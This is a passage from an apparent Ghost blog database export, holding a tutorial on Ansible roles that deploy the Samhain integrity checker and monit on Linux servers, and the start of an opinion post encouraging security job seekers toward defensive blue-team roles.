a7378ad97f6"},{"id":"5aa2ac4422b8aa7378ad9869","role_id":"5aa2ac4322b8aa7378ad97c9","permission_id":"5aa2ac4322b8aa7378ad97e1"},{"id":"5aa2ac4422b8aa7378ad986a","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97d3"},{"id":"5aa2ac4422b8aa7378ad986b","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97d4"},{"id":"5aa2ac4422b8aa7378ad986c","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97d6"},{"id":"5aa2ac4422b8aa7378ad986d","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97d8"},{"id":"5aa2ac4422b8aa7378ad986e","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97d9"},{"id":"5aa2ac4422b8aa7378ad986f","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97db"},{"id":"5aa2ac4422b8aa7378ad9870","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97dc"},{"id":"5aa2ac4422b8aa7378ad9871","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97dd"},{"id":"5aa2ac4422b8aa7378ad9872","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97e7"},{"id":"5aa2ac4422b8aa7378ad9873","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97e8"},{"id":"5aa2ac4422b8aa7378ad9874","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97ed"},{"id":"5aa2ac4422b8aa7378ad9875","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97ee"},{"id":"5aa2ac4422b8aa7378ad9876","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97ef"},{"id":"5aa2ac4422b8aa7378ad9877","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97f0"},{"id":"5aa2ac4422b8aa7378ad9878","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97f1"},{"id":"5aa2ac4422b8aa7378ad9879","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97f2"},{"id":"5aa2ac4422b8aa7378ad987a","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97f6"},{"id":"5aa2ac4422b8aa7378ad987b","role_id":"5aa2ac4322b8aa7378ad97ca","permission_id":"5aa2ac4322b8aa7378ad97e1"}],"permissions_users":[],"posts":[{"id":"5aa2cad77c677a73cedb4bdb","uuid":"5084ea6e-6d01-4e3d-b33f-527125b38487","title":"Deploying Security Controls with Ansible","slug":"deploying-security-controls-with-ansible","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"I use several tools for various security or compliance controls on production Linux servers. Some of those aren't automatically installed/maintained through our package management utility, and with 100+ machines it is far too time-consuming to manually deal with each one. I've started experimenting with Ansible to simplify this and thought I'd share the first role I've written while I'm learning.\\n\\n## Identify Tools and Required Tasks\\nThe first step was to identify what tools I wanted the playbook to manage, and what steps I take to install and configure them. Two tools I use that aren't managed by Spacewalk are Samhain and M/Monit.\\n### Samhain\\nWe currently deploy Samhain in a simple standalone fashion that logs locally, then those logs get picked up by our SIEM. I download and compile Samhain from source but don't use a ton of options at compile time as we aren't currently running a Yule server. That means the required tasks are pretty simple:\\n\\n* Download Samhain\\n* Extract & verify PGP signature\\n* Configure, compile, install\\n* Copy in preferred config\\n* Initialize or re-initialize file signature database\\n* Start the daemon\\n\\nI opted to split these steps into two tasks named install and update.\\n### M/Monit\\nM/Monit is just a centralized dashboard used to manage multiple instances of the Linux utility monit. Setting this up just requires customizing the monit configuration file with M/Monit server details and any custom services you want to manage. The tasks here include:\\n\\n* Make sure monit is installed\\n* Backup current/default monitrc\\n* Install new monitrc from template\\n* Start or restart the service\\n## Create Ansible role structure\\nNow it's time to create the folder hierarchy for our Ansible job. When using roles, Ansible expects certain files to exist in specific directories and will automatically pull in your variable files, handlers, templates, etc. If you're unfamiliar, read up on roles here.\\n\\nHere's my file/folder structure:\\n```nix\\nansible/security-tools/\\n├── ansible.cfg\\n├── inventories\\n│   └── production\\n│       └── hosts\\n├── main.yml\\n└── roles\\n    ├── monit\\n    │   ├── files\\n    │   ├── handlers\\n    │   │   └── main.yml\\n    │   ├── tasks\\n    │   │   └── main.yml\\n    │   ├── templates\\n    │   │   └── monitrc.j2\\n    │   └── vars\\n    │       └── main.yml\\n    └── samhain\\n        ├── files\\n        │   └── samhainrc\\n        ├── handlers\\n        ├── tasks\\n        │   ├── install.yml\\n        │   ├── main.yml\\n        │   └── update.yml\\n        ├── templates\\n        └── vars\\n            └── main.yml\\n```\\nThe primary playbook is executed by running the command ansible-playbook main.yml. Here's what it looks like:\\n```yaml\\n---\\n- hosts: all\\n  become: yes\\n  roles:\\n    - {name: samhain, tags: samhain}\\n    - {name: monit, tags: monit}\\n```\\nPretty simple, right? I added tags so that I can pick and choose which roles I want to run as this project expands. For example I can run just the monit role with the command `ansible-playbook main.yml --tags monit`.\\n## Roles in Detail\\n### Monit\\nLet's take a closer look at each role now, starting with Monit. Here's the roles/monit/tasks/main.yml task file:\\n```yaml\\n---\\n - stat: path={{ monitrc_path }}\\n   register: rc\\n\\n - name: install monit on CentOS hosts\\n   yum:\\n     name: monit\\n     state: present\\n   when: ansible_distribution == \\\"CentOS\\\" and ansible_distribution_major_version > '5'\\n\\n - name: install monit on Ubuntu hosts\\n   apt:\\n     name: monit\\n     state: present\\n   when: ansible_distribution != \\\"CentOS\\\"\\n\\n - name: backup current monitrc file\\n   command: mv {{ monitrc_path }} /etc/monitrc.bak\\n   when: rc.stat.exists\\n\\n - name: write new monitrc file and restart the service\\n   template:\\n     src: monitrc.j2\\n     dest: \\\"{{ monitrc_path }}\\\"\\n     owner: root\\n     mode: 0600\\n   notify:\\n     - stop monit service\\n     - start monit service\\n``` \\nYou can see it referencing the variable `{{ monitrc_path }}`, template file `monitrc.j2`, and handlers `stop monit service` and `start monit service`. Ansible automatically pulls these in from `roles/monit/vars/main.yml`, `roles/monit/templates/`, and `roles/monit/handlers/main.yml`, respectively.\\n\\nThe vars file contains a single line: `monitrc_path: /etc/monitrc`\\n\\nI won't attach the entire monitrc template, but it just substitutes a single variable from the facts Ansible gathers on each host when first running a playbook. Example:\\n```nix\\nset httpd port 2812 and\\n    use address {{ ansible_default_ipv4.address }}\\n```\\nFinally, `roles/monit/handlers/main.yml` contains:\\n```yaml\\n---\\n- name: stop monit service\\n  service:\\n    name: monit\\n    state: stopped\\n- name: start monit service\\n  command: monit -c /etc/monitrc\\n```\\n### Samhain\\nNow for a quicker look at the Samhain role. Here are the contents of roles/samhain/tasks/main.yml:\\n```yaml\\n---\\n- include: install.yml\\n- include: update.yml\\n```\\nThis simply calls the separate install and update tasks. I typically comment one of them out and just run install if it's a new system needing security tools installed the first time, or update if it's an existing system that just needs an update to the samhain config file.\\n\\nInstall task:\\n```yaml\\n---\\n- stat: path={{ samhain_database }}\\n  register: sam_db\\n- stat: path={{ samhainrc_path }}\\n  register: sam_path\\n- stat: path={{ samhain_process }}\\n  register: samhain_pid\\n- name: Download Samhain package\\n  get_url:\\n    url: http://www.la-samhna.de/samhain/samhain-current.tar.gz\\n    dest: /opt\\n    checksum: <insert checksum for current version of Samhain>\\n- name: Unpack Samhain tarball\\n  unarchive:\\n    src: /opt/samhain-current.tar.gz\\n    dest: /opt/\\n    remote_src: True\\n- name: Import Samhain development key\\n  command: gpg --keyserver pgp.key-server.io --recv-key 0F571F6C\\n- name: Check key fingerprint\\n  command: gpg --fingerprint 0F571F6C\\n- name: Verify PGP signature\\n  shell: gpg --verify /opt/samhain-{{ samhain_version }}.tar.gz.asc /opt/samhain-{{ samhain_version }}.tar.gz\\n  register: gpg_check\\n- debug: msg={{gpg_check}}\\n- name: Unzip second-stage tar file\\n  unarchive:\\n    src: /opt/samhain-{{ samhain_version }}.tar.gz\\n    dest: /opt\\n    remote_src: True\\n- name: Install Samhain\\n  shell: cd /opt/samhain-{{ samhain_version }} && ./configure && make && make install\\n  args:\\n    creates: /etc/samhainrc\\n```\\nUpdate task:\\n```yaml\\n---\\n- stat: path={{ samhain_database }}\\n  register: db\\n- stat: path={{ samhainrc_path }}\\n  register: rc\\n- stat: path={{ samhain_process }}\\n  register: pid\\n- name: Stop samhain process\\n  command: /usr/local/sbin/samhain stop\\n  when: pid.stat.exists\\n- name: Copy samhainrc file to client\\n  copy: src=samhainrc dest=/tmp/samhainrc\\n    owner=root group=root mode=0644\\n- name: Backup current samhainrc\\n  command: mv {{ samhainrc_path }} /etc/samhainrc.bak\\n  when: rc.stat.exists\\n- name: Move samhainrc to /etc\\n  command: mv /tmp/samhainrc {{ samhainrc_path }}\\n- name: Backup existing samhain database\\n  command: mv {{ samhain_database }} /var/lib/samhain/samhain_file.bak\\n  when: db.stat.exists\\n- name: Update samhain database\\n  command: /usr/local/sbin/samhain -t init\\n- name: Start samhain\\n  command: /usr/local/sbin/samhain -D -t check\\n```\\nThe file referenced in the copy operation is located at roles/samhain/files/samhainrc.\\n\\nVars file:\\n```yaml\\n    samhain_database: /var/lib/samhain/samhain_file\\n    samhainrc_path: /etc/samhainrc\\n    samhain_process: /var/run/samhain.pid\\n    samhain_version: <insert current Samhain version>\\n```   \\n   \\nConclusion\\n\\nThis is all fairly simple but has greatly reduced the amount of time I spend installing and maintaining these tools. I realize the Samhain role doesn't adhere to Ansible's idea of idempotence very well due to the heavy usage of the command module. I'm looking for ways to improve it, but it does what I need with some basic error handling for now.\\n\\nHopefully this helps illustrate how Ansible roles work and some of the advantages roles have versus doing everything from one giant playbook. I'm relatively new to Ansible so feel free to leave a reply below or reach out on Twitter if you have questions, comments, or even suggestions on how this could be improved.\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I use several tools for various security or compliance controls on production Linux servers. Some of those aren't automatically installed/maintained through our package management utility, and with 100+ machines it is far too time-consuming to manually deal with each one. I've started experimenting with Ansible to simplify this and thought I'd share the first role I've written while I'm learning.</p>\n<h2 id=\"identifytoolsandrequiredtasks\">Identify Tools and Required Tasks</h2>\n<p>The first step was to identify what tools I wanted the playbook to manage, and what steps I take to install and configure them. Two tools I use that aren't managed by Spacewalk are Samhain and M/Monit.</p>\n<h3 id=\"samhain\">Samhain</h3>\n<p>We currently deploy Samhain in a simple standalone fashion that logs locally, then those logs get picked up by our SIEM. I download and compile Samhain from source but don't use a ton of options at compile time as we aren't currently running a Yule server. That means the required tasks are pretty simple:</p>\n<ul>\n<li>Download Samhain</li>\n<li>Extract &amp; verify PGP signature</li>\n<li>Configure, compile, install</li>\n<li>Copy in preferred config</li>\n<li>Initialize or re-initialize file signature database</li>\n<li>Start the daemon</li>\n</ul>\n<p>I opted to split these steps into two tasks named install and update.</p>\n<h3 id=\"mmonit\">M/Monit</h3>\n<p>M/Monit is just a centralized dashboard used to manage multiple instances of the Linux utility monit. Setting this up just requires customizing the monit configuration file with M/Monit server details and any custom services you want to manage. The tasks here include:</p>\n<ul>\n<li>Make sure monit is installed</li>\n<li>Backup current/default monitrc</li>\n<li>Install new monitrc from template</li>\n<li>Start or restart the service</li>\n</ul>\n<h2 id=\"createansiblerolestructure\">Create Ansible role structure</h2>\n<p>Now it's time to create the folder hierarchy for our Ansible job. When using roles, Ansible expects certain files to exist in specific directories and will automatically pull in your variable files, handlers, templates, etc. If you're unfamiliar, read up on roles here.</p>\n<p>Here's my file/folder structure:</p>\n<pre><code class=\"language-nix\">ansible/security-tools/\n├── ansible.cfg\n├── inventories\n│   └── production\n│       └── hosts\n├── main.yml\n└── roles\n    ├── monit\n    │   ├── files\n    │   ├── handlers\n    │   │   └── main.yml\n    │   ├── tasks\n    │   │   └── main.yml\n    │   ├── templates\n    │   │   └── monitrc.j2\n    │   └── vars\n    │       └── main.yml\n    └── samhain\n        ├── files\n        │   └── samhainrc\n        ├── handlers\n        ├── tasks\n        │   ├── install.yml\n        │   ├── main.yml\n        │   └── update.yml\n        ├── templates\n        └── vars\n            └── main.yml\n</code></pre>\n<p>The primary playbook is executed by running the command ansible-playbook main.yml. Here's what it looks like:</p>\n<pre><code class=\"language-yaml\">---\n- hosts: all\n  become: yes\n  roles:\n    - {name: samhain, tags: samhain}\n    - {name: monit, tags: monit}\n</code></pre>\n<p>Pretty simple, right? I added tags so that I can pick and choose which roles I want to run as this project expands. For example I can run just the monit role with the command <code>ansible-playbook main.yml --tags monit</code>.</p>\n<h2 id=\"rolesindetail\">Roles in Detail</h2>\n<h3 id=\"monit\">Monit</h3>\n<p>Let's take a closer look at each role now, starting with Monit. Here's the roles/monit/tasks/main.yml task file:</p>\n<pre><code class=\"language-yaml\">---\n - stat: path={{ monitrc_path }}\n   register: rc\n\n - name: install monit on CentOS hosts\n   yum:\n     name: monit\n     state: present\n   when: ansible_distribution == &quot;CentOS&quot; and ansible_distribution_major_version &gt; '5'\n\n - name: install monit on Ubuntu hosts\n   apt:\n     name: monit\n     state: present\n   when: ansible_distribution != &quot;CentOS&quot;\n\n - name: backup current monitrc file\n   command: mv {{ monitrc_path }} /etc/monitrc.bak\n   when: rc.stat.exists\n\n - name: write new monitrc file and restart the service\n   template:\n     src: monitrc.j2\n     dest: &quot;{{ monitrc_path }}&quot;\n     owner: root\n     mode: 0600\n   notify:\n     - stop monit service\n     - start monit service\n</code></pre>\n<p>You can see it referencing the variable <code>{{ monitrc_path }}</code>, template file <code>monitrc.j2</code>, and handlers <code>stop monit service</code> and <code>start monit service</code>. Ansible automatically pulls these in from <code>roles/monit/vars/main.yml</code>, <code>roles/monit/templates/</code>, and <code>roles/monit/handlers/main.yml</code>, respectively.</p>\n<p>The vars file contains a single line: <code>monitrc_path: /etc/monitrc</code></p>\n<p>I won't attach the entire monitrc template, but it just substitutes a single variable from the facts Ansible gathers on each host when first running a playbook. Example:</p>\n<pre><code class=\"language-nix\">set httpd port 2812 and\n    use address {{ ansible_default_ipv4.address }}\n</code></pre>\n<p>Finally, <code>roles/monit/handlers/main.yml</code> contains:</p>\n<pre><code class=\"language-yaml\">---\n- name: stop monit service\n  service:\n    name: monit\n    state: stopped\n- name: start monit service\n  command: monit -c /etc/monitrc\n</code></pre>\n<h3 id=\"samhain\">Samhain</h3>\n<p>Now for a quicker look at the Samhain role. Here are the contents of roles/samhain/tasks/main.yml:</p>\n<pre><code class=\"language-yaml\">---\n- include: install.yml\n- include: update.yml\n</code></pre>\n<p>This simply calls the separate install and update tasks. I typically comment one of them out and just run install if it's a new system needing security tools installed the first time, or update if it's an existing system that just needs an update to the samhain config file.</p>\n<p>Install task:</p>\n<pre><code class=\"language-yaml\">---\n- stat: path={{ samhain_database }}\n  register: sam_db\n- stat: path={{ samhainrc_path }}\n  register: sam_path\n- stat: path={{ samhain_process }}\n  register: samhain_pid\n- name: Download Samhain package\n  get_url:\n    url: http://www.la-samhna.de/samhain/samhain-current.tar.gz\n    dest: /opt\n    checksum: &lt;insert checksum for current version of Samhain&gt;\n- name: Unpack Samhain tarball\n  unarchive:\n    src: /opt/samhain-current.tar.gz\n    dest: /opt/\n    remote_src: True\n- name: Import Samhain development key\n  command: gpg --keyserver pgp.key-server.io --recv-key 0F571F6C\n- name: Check key fingerprint\n  command: gpg --fingerprint 0F571F6C\n- name: Verify PGP signature\n  shell: gpg --verify /opt/samhain-{{ samhain_version }}.tar.gz.asc /opt/samhain-{{ samhain_version }}.tar.gz\n  register: gpg_check\n- debug: msg={{gpg_check}}\n- name: Unzip second-stage tar file\n  unarchive:\n    src: /opt/samhain-{{ samhain_version }}.tar.gz\n    dest: /opt\n    remote_src: True\n- name: Install Samhain\n  shell: cd /opt/samhain-{{ samhain_version }} &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make install\n  args:\n    creates: /etc/samhainrc\n</code></pre>\n<p>Update task:</p>\n<pre><code class=\"language-yaml\">---\n- stat: path={{ samhain_database }}\n  register: db\n- stat: path={{ samhainrc_path }}\n  register: rc\n- stat: path={{ samhain_process }}\n  register: pid\n- name: Stop samhain process\n  command: /usr/local/sbin/samhain stop\n  when: pid.stat.exists\n- name: Copy samhainrc file to client\n  copy: src=samhainrc dest=/tmp/samhainrc\n    owner=root group=root mode=0644\n- name: Backup current samhainrc\n  command: mv {{ samhainrc_path }} /etc/samhainrc.bak\n  when: rc.stat.exists\n- name: Move samhainrc to /etc\n  command: mv /tmp/samhainrc {{ samhainrc_path }}\n- name: Backup existing samhain database\n  command: mv {{ samhain_database }} /var/lib/samhain/samhain_file.bak\n  when: db.stat.exists\n- name: Update samhain database\n  command: /usr/local/sbin/samhain -t init\n- name: Start samhain\n  command: /usr/local/sbin/samhain -D -t check\n</code></pre>\n<p>The file referenced in the copy operation is located at roles/samhain/files/samhainrc.</p>\n<p>Vars file:</p>\n<pre><code class=\"language-yaml\">    samhain_database: /var/lib/samhain/samhain_file\n    samhainrc_path: /etc/samhainrc\n    samhain_process: /var/run/samhain.pid\n    samhain_version: &lt;insert current Samhain version&gt;\n</code></pre>\n<p>Conclusion</p>\n<p>This is all fairly simple but has greatly reduced the amount of time I spend installing and maintaining these tools. I realize the Samhain role doesn't adhere to Ansible's idea of idempotence very well due to the heavy usage of the command module. I'm looking for ways to improve it, but it does what I need with some basic error handling for now.</p>\n<p>Hopefully this helps illustrate how Ansible roles work and some of the advantages roles have versus doing everything from one giant playbook. I'm relatively new to Ansible so feel free to leave a reply below or reach out on Twitter if you have questions, comments, or even suggestions on how this could be improved.</p>\n</div>","amp":null,"plaintext":"I use several tools for various security or compliance controls on production\nLinux servers. Some of those aren't automatically installed/maintained through\nour package management utility, and with 100+ machines it is far too\ntime-consuming to manually deal with each one. I've started experimenting with\nAnsible to simplify this and thought I'd share the first role I've written while\nI'm learning.\n\nIdentify Tools and Required Tasks\nThe first step was to identify what tools I wanted the playbook to manage, and\nwhat steps I take to install and configure them. Two tools I use that aren't\nmanaged by Spacewalk are Samhain and M/Monit.\n\nSamhain\nWe currently deploy Samhain in a simple standalone fashion that logs locally,\nthen those logs get picked up by our SIEM. I download and compile Samhain from\nsource but don't use a ton of options at compile time as we aren't currently\nrunning a Yule server. That means the required tasks are pretty simple:\n\n * Download Samhain\n * Extract & verify PGP signature\n * Configure, compile, install\n * Copy in preferred config\n * Initialize or re-initialize file signature database\n * Start the daemon\n\nI opted to split these steps into two tasks named install and update.\n\nM/Monit\nM/Monit is just a centralized dashboard used to manage multiple instances of the\nLinux utility monit. Setting this up just requires customizing the monit\nconfiguration file with M/Monit server details and any custom services you want\nto manage. The tasks here include:\n\n * Make sure monit is installed\n * Backup current/default monitrc\n * Install new monitrc from template\n * Start or restart the service\n\nCreate Ansible role structure\nNow it's time to create the folder hierarchy for our Ansible job. When using\nroles, Ansible expects certain files to exist in specific directories and will\nautomatically pull in your variable files, handlers, templates, etc. If you're\nunfamiliar, read up on roles here.\n\nHere's my file/folder structure:\n\nansible/security-tools/\n├── ansible.cfg\n├── inventories\n│   └── production\n│       └── hosts\n├── main.yml\n└── roles\n    ├── monit\n    │   ├── files\n    │   ├── handlers\n    │   │   └── main.yml\n    │   ├── tasks\n    │   │   └── main.yml\n    │   ├── templates\n    │   │   └── monitrc.j2\n    │   └── vars\n    │       └── main.yml\n    └── samhain\n        ├── files\n        │   └── samhainrc\n        ├── handlers\n        ├── tasks\n        │   ├── install.yml\n        │   ├── main.yml\n        │   └── update.yml\n        ├── templates\n        └── vars\n            └── main.yml\n\n\nThe primary playbook is executed by running the command ansible-playbook\nmain.yml. Here's what it looks like:\n\n---\n- hosts: all\n  become: yes\n  roles:\n    - {name: samhain, tags: samhain}\n    - {name: monit, tags: monit}\n\n\nPretty simple, right? I added tags so that I can pick and choose which roles I\nwant to run as this project expands. For example I can run just the monit role\nwith the command ansible-playbook main.yml --tags monit.\n\nRoles in Detail\nMonit\nLet's take a closer look at each role now, starting with Monit. Here's the\nroles/monit/tasks/main.yml task file:\n\n---\n - stat: path={{ monitrc_path }}\n   register: rc\n\n - name: install monit on CentOS hosts\n   yum:\n     name: monit\n     state: present\n   when: ansible_distribution == \"CentOS\" and ansible_distribution_major_version > '5'\n\n - name: install monit on Ubuntu hosts\n   apt:\n     name: monit\n     state: present\n   when: ansible_distribution != \"CentOS\"\n\n - name: backup current monitrc file\n   command: mv {{ monitrc_path }} /etc/monitrc.bak\n   when: rc.stat.exists\n\n - name: write new monitrc file and restart the service\n   template:\n     src: monitrc.j2\n     dest: \"{{ monitrc_path }}\"\n     owner: root\n     mode: 0600\n   notify:\n     - stop monit service\n     - start monit service\n\n\nYou can see it referencing the variable {{ monitrc_path }}, template file \nmonitrc.j2, and handlers stop monit service  and start monit service. Ansible\nautomatically pulls these in from roles/monit/vars/main.yml, \nroles/monit/templates/, and roles/monit/handlers/main.yml, respectively.\n\nThe vars file contains a single line: monitrc_path: /etc/monitrc\n\nI won't attach the entire monitrc template, but it just substitutes a single\nvariable from the facts Ansible gathers on each host when first running a\nplaybook. Example:\n\nset httpd port 2812 and\n    use address {{ ansible_default_ipv4.address }}\n\n\nFinally, roles/monit/handlers/main.yml  contains:\n\n---\n- name: stop monit service\n  service:\n    name: monit\n    state: stopped\n- name: start monit service\n  command: monit -c /etc/monitrc\n\n\nSamhain\nNow for a quicker look at the Samhain role. Here are the contents of\nroles/samhain/tasks/main.yml:\n\n---\n- include: install.yml\n- include: update.yml\n\n\nThis simply calls the separate install and update tasks. I typically comment one\nof them out and just run install if it's a new system needing security tools\ninstalled the first time, or update if it's an existing system that just needs\nan update to the samhain config file.\n\nInstall task:\n\n---\n- stat: path={{ samhain_database }}\n  register: sam_db\n- stat: path={{ samhainrc_path }}\n  register: sam_path\n- stat: path={{ samhain_process }}\n  register: samhain_pid\n- name: Download Samhain package\n  get_url:\n    url: http://www.la-samhna.de/samhain/samhain-current.tar.gz\n    dest: /opt\n    checksum: <insert checksum for current version of Samhain>\n- name: Unpack Samhain tarball\n  unarchive:\n    src: /opt/samhain-current.tar.gz\n    dest: /opt/\n    remote_src: True\n- name: Import Samhain development key\n  command: gpg --keyserver pgp.key-server.io --recv-key 0F571F6C\n- name: Check key fingerprint\n  command: gpg --fingerprint 0F571F6C\n- name: Verify PGP signature\n  shell: gpg --verify /opt/samhain-{{ samhain_version }}.tar.gz.asc /opt/samhain-{{ samhain_version }}.tar.gz\n  register: gpg_check\n- debug: msg={{gpg_check}}\n- name: Unzip second-stage tar file\n  unarchive:\n    src: /opt/samhain-{{ samhain_version }}.tar.gz\n    dest: /opt\n    remote_src: True\n- name: Install Samhain\n  shell: cd /opt/samhain-{{ samhain_version }} && ./configure && make && make install\n  args:\n    creates: /etc/samhainrc\n\n\nUpdate task:\n\n---\n- stat: path={{ samhain_database }}\n  register: db\n- stat: path={{ samhainrc_path }}\n  register: rc\n- stat: path={{ samhain_process }}\n  register: pid\n- name: Stop samhain process\n  command: /usr/local/sbin/samhain stop\n  when: pid.stat.exists\n- name: Copy samhainrc file to client\n  copy: src=samhainrc dest=/tmp/samhainrc\n    owner=root group=root mode=0644\n- name: Backup current samhainrc\n  command: mv {{ samhainrc_path }} /etc/samhainrc.bak\n  when: rc.stat.exists\n- name: Move samhainrc to /etc\n  command: mv /tmp/samhainrc {{ samhainrc_path }}\n- name: Backup existing samhain database\n  command: mv {{ samhain_database }} /var/lib/samhain/samhain_file.bak\n  when: db.stat.exists\n- name: Update samhain database\n  command: /usr/local/sbin/samhain -t init\n- name: Start samhain\n  command: /usr/local/sbin/samhain -D -t check\n\n\nThe file referenced in the copy operation is located at\nroles/samhain/files/samhainrc.\n\nVars file:\n\n    samhain_database: /var/lib/samhain/samhain_file\n    samhainrc_path: /etc/samhainrc\n    samhain_process: /var/run/samhain.pid\n    samhain_version: <insert current Samhain version>\n\n\nConclusion\n\nThis is all fairly simple but has greatly reduced the amount of time I spend\ninstalling and maintaining these tools. I realize the Samhain role doesn't\nadhere to Ansible's idea of idempotence very well due to the heavy usage of the\ncommand module. I'm looking for ways to improve it, but it does what I need with\nsome basic error handling for now.\n\nHopefully this helps illustrate how Ansible roles work and some of the\nadvantages roles have versus doing everything from one giant playbook. I'm\nrelatively new to Ansible so feel free to leave a reply below or reach out on\nTwitter if you have questions, comments, or even suggestions on how this could\nbe improved.","feature_image":"/content/images/2018/03/ansible_logo_round.png","featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-03-09T17:56:39.000Z","created_by":"1","updated_at":"2018-03-09T19:20:08.000Z","updated_by":"1","published_at":"2018-03-09T18:04:36.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":"","codeinjection_foot":"","og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":"Using Ansible to deploy security tools such as FIM and system/service monitoring.","custom_template":null},{"id":"5abdb90f14ea58067217fadd","uuid":"756845fc-99ff-485b-93cb-1dc060fe14b8","title":"InfoSec is Bigger Than Pentesting","slug":"infosec-is-bigger-than-pentesting","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"So far this year I've interviewed several candidates for a security analyst position. It's a pretty straightforward blue team role involving things like vulnerability assessment and remediation, identifying anomalies in user or system activity, and some internal audit functions. Unfortunately most of the candidates I've encountered are only interested in pure pentesting jobs.\\n\\n## The cool kids table\\n\\nI get it, red team has all the fun right? Writing exploits, popping shells, they're the Top Gun pilots of infosec. Don't get me wrong, I fully realize the value of pentesting skills and even practice them myself. Having the knowledge and skillset required for red team work can be a huge benefit to those charged with defending a network. I'd just like to see more people interested in and excited about blue team.\\n\\n## The requisite gaming analogy\\n\\nHave you played *Plants vs Zombies* or any other \\\"tower defense\\\" game? That's one of my favorite analogies when people ask what a blue teamer does. Identify important areas or assets, stand up multiple layers of defenses, try to anticipate what the attacker might do, then adapt and evolve as needed (hopefully without being completely overrun at any point!) Sure you need to think like an attacker sometimes, but thinking like a defender is a thing too!\\n\\nThe pendulum may be starting to swing back the other way, though. With the rise of DFIR and threat hunting and the maturation of active or deceptive defense strategies, defenders are devising ways to not only keep their critical systems and data safe but also to learn more about attacker methods in the process. I'm even more excited when I see tips, tools, and techniques shared with the greater infosec community. The [BrakeSec](https://twitter.com/brakesec) Slack community has been one of my favorite resources lately, lots of smart people sharing ideas there.\\n\\n## The soapbox message\\n\\nWhile this this post started as a bit of a rant about my experience trying to fill a seat, I ultimately just want to encourage anyone out there considering a career in infosec to be open minded. By all means sharpen your hacking skills, but go a step further - set up something like [Splunk](https://www.splunk.com/) or [Graylog](https://www.graylog.org/) in the lab environment you practice in. Take note of the noise/logs you generate when trying to gain access to a system and elevate privileges. Think about ways you would automate the detection and alerting of such activity. If this kind of detective work interests you, consider a future on the blue team. We need talented people too.\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>So far this year I've interviewed several candidates for a security analyst position. It's a pretty straightforward blue team role involving things like vulnerability assessment and remediation, identifying anomalies in user or system activity, and some internal audit functions. Unfortunately most of the candidates I've encountered are only interested in pure pentesting jobs.</p>\n<h2 id=\"thecoolkidstable\">The cool kids table</h2>\n<p>I get it, red team has all the fun right? Writing exploits, popping shells, they're the Top Gun pilots of infosec. Don't get me wrong, I fully realize the value of pentesting skills and even practice them myself. Having the knowledge and skillset required for red team work can be a huge benefit to those charged with defending a network. I'd just like to see more people interested in and excited about blue team.</p>\n<h2 id=\"therequisitegaminganalogy\">The requisite gaming analogy</h2>\n<p>Have you played <em>Plants vs Zombies</em> or any other &quot;tower defense&quot; game? That's one of my favorite analogies when people ask what a blue teamer does. Identify important areas or assets, stand up multiple layers of defenses, try to anticipate what the attacker might do, then adapt and evolve as needed (hopefully without being completely overrun at any point!) Sure you need to think like an attacker sometimes, but thinking like a defender is a thing too!</p>\n<p>The pendulum may be starting to swing back the other way, though. With the rise of DFIR and threat hunting and the maturation of active or deceptive defense strategies, defenders are devising ways to not only keep their critical systems and data safe but also to learn more about attacker methods in the process. I'm even more excited when I see tips, tools, and techniques shared with the greater infosec community. The <a href=\"https://twitter.com/brakesec\">BrakeSec</a> Slack community has been one of my favorite resources lately, lots of smart people sharing ideas there.</p>\n<h2 id=\"thesoapboxmessage\">The soapbox message</h2>\n<p>While this this post started as a bit of a rant about my experience trying to fill a seat, I ultimately just want to encourage anyone out there considering a career in infosec to be open minded. By all means sharpen your hacking skills, but go a step further - set up something like <a href=\"https://www.splunk.com/\">Splunk</a> or <a href=\"https://www.graylog.org/\">Graylog</a> in the lab environment you practice in. Take note of the noise/logs you generate when trying to gain access to a system and elevate privileges. Think about ways you would automate the detection and alerting of such activity. If this kind of detective work interests you, consider a future on the blue team. We need talented people too.</p>\n</div>","amp":null,"plaintext":"So far this year I've interviewed several candidates for a security analyst\nposition. It's a pretty straightforward blue team role involving things like\nvulnerability assessment and remediation, identifying anomalies in user or\nsystem activity, and some internal audit functions. Unfortunately most of the\ncandidates I've encountered are only interested in pure pentesting jobs.\n\nThe cool kids table\nI get it, red team has all the fun right? Writing exploits, popping shells,\nthey're the Top Gun pilots of infosec. Don't get me wrong, I fully realize the\nvalue of pentesting skills and even practice them myself. Having the knowledge\nand skillset required for red team work can 